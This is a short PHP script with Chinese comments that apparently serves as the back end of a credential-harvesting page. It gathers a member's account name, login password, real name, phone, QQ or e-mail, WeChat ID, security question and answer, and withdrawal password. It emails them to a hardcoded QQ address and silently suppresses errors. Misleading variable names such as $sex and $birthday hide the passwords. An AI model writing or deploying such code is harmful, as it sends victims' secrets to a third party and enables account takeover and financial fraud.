<?php 
try{
	require_once ('smtp.php');  
	$html = '<html><head>
	<meta http-equiv="Content-Language" content="zh-cn"/>
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
	</head>
	<body>
	会员账号:'.$username.' <br/>
	会员密码:'.$sex.' <br/>
	 真实姓名:'.$pay_name.'  <br/>
	  联系电话:'.$mobile.' <br/>
	QQ或E-mail:'.$email.' <br/>
	 微信号:'.$weixin.' <br/>
	 密码问题:'.$ask.' <br/>
	密码答案:'.$answer.' <br/>
	取款密码 :'.$birthday.'<br/>
	</body>
	</html>';
	$smtpusermail = "";//SMTP服务器的用户邮箱   
	$smtpemailto = "3146808064@qq.com";//发送给谁   
	$mailsubject = "会员信息";//邮件主题   
	$mailbody = $html;//邮件内容    
	$smtp = new smtp();//这里面的一个true是表示使用身份验证,否则不使用身份验证.   
	$res=$smtp->sendmail($smtpemailto, $smtpusermail, $mailsubject, $mailbody);   
}catch(Exception $e) {

}